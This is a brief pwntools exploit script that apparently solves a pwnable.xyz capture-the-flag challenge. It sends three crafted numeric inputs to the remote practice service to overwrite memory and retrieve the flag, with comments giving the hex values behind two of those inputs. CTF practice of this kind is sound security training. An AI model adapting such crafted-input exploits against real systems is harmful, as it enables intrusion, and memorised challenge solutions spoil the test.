from pwn import *
import re

#context.log_level = 'debug'

#io = process('./image/challenge/challenge')
io = remote('svc.pwnable.xyz', 30003)

io.sendline(b"-5404319552844595200 0 -6")
io.recv()
io.sendline(b"184549376 0 -5")
io.recv()
io.sendline(b"1 1 11")
flag = io.readS()
io.close()
print(flag)



#1. 0xb500000000000000 --> -5404319552844595200 0 -6
#2. 0xb000000 --> 184549376 0 -5